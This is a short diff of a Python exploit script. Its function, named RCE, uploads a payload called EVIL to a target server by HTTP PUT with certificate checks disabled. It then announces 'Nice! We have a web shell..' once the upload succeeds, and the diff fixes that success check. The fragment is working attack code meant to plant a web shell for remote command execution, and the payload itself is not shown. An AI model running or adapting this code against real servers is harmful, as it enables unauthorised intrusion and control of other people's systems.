@@ -62,7 +62,7 @@ def RCE(url,f):
     headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
     requests.packages.urllib3.disable_warnings()
     req=requests.put(str(url)+f+"/",data=EVIL, headers=headers,verify=False)
-    if req.status == 200:
+    if req.status_code == 204:
         print 'Nice! We have a web shell..'
     
 
